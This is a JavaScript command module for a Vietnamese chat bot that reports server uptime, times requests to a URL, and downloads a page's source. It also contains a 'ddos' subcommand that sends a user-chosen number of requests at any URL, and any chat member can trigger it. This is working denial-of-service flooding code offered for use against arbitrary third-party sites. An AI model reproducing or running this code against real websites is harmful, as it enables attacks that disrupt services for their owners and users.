module.exports.config = {
    name: "api",
    version: "1.0.0",
    hasPermssion: 0,
    credits: "DVB",
    description: "Xem 1 số thông tin & thống kê url\nVui lòng điền đủ https:// hoặc http:// để tránh lỗi",
    commandCategory: "Tiện ích",
    usages: "[Tùy chọn] [url]",
    cooldowns: 5,
};

const UPT = "https://database-test.bangprocode.repl.co/api/uptime";

module.exports.languages = {"vi": {}}
module.exports.run = async function ({ api, event, args, Users, permssion, getText }) {
const axios = require("axios");
const fs = require("fs-extra");
var text = args.join(" ").split(" ");
const API = text[1];
const S2  = text[2];
/////////////////////////////////
if( text[0] == "upt"){
  const data = (await axios.get(UPT)).data;
  api.sendMessage(`❯ Cpu model: ${data.cpu}\n❯ Ram Users: ${data.memory}\n❯ Uptime: ${data.uptime}`, event.threadID, event.messageID,);
};

/////////////////////////////////
if( text[0] == "test"){
  var d = new Date();
  var starttime = d.getTime();
  const data = await axios.get(API).catch(error => {
  var d21 = new Date();
  var endtime1 = d21.getTime();
  var totaltime1 = (endtime1 - starttime)/1000;
  var result1 = Math.round(totaltime1*100)/100;  
  api.sendMessage(`Đã xảy ra lỗi!\n❯ Status: ${error.response.status} (${error.response.statusText})\n❯ Method: ${error.request.method}\n❯ Default Port:${error.request.agent.defaultPort}\n❯ Deley: " ${result1}Ms`, event.threadID, event.messageID);
  api.sendMessage("Source: \n" + error.response.data, event.threadID, event.messageID)})
  var d2 = new Date();
  var endtime = d2.getTime();
  var totaltime = (endtime - starttime)/1000;
  var result = Math.round(totaltime*100)/100;  
  api.sendMessage(`❯ Deley: ${result}Ms\n❯ Method: ${data.request.method}\n❯ Default Port: ${data.request.agent.defaultPort}\n❯ Status: ${data.status} (${data.statusText})\n❯ Path: ${data.request.path}`, event.threadID, event.messageID)
};

/////////////////////////////////
if( text[0] == "scr"){
  const dirFile = __dirname + "/cache/source.txt"
  const data = await axios.get(API).catch(error => {
  api.sendMessage("Source: \n" + error.response.data, event.threadID, event.messageID)});
  const getdata = await axios.get(API);
  fs.writeFileSync(dirFile, getdata.data, "utf-8");
  api.sendMessage({body: `Chetchamay! đây là source của ${API}`,attachment: fs.createReadStream(dirFile)}, event.threadID, () => fs.unlinkSync(dirFile), event.messageID);
};

/////////////////////////////////
const request = require("request");
if( text[0] == "ddos"){
  const data = await axios.get(API).catch(error => {
  api.sendMessage("Error", event.threadID, event.messageID)
  });
  api.sendMessage("Khởi chạy tiến trình", event.threadID, event.messageID);
  for (i = 0; i < S2 ; i+=1){
    request(encodeURI(API));
  }
  return api.sendMessage(`Đã gửi ${S2} request vào ${API} `, event.threadID, event.messageID);

};

};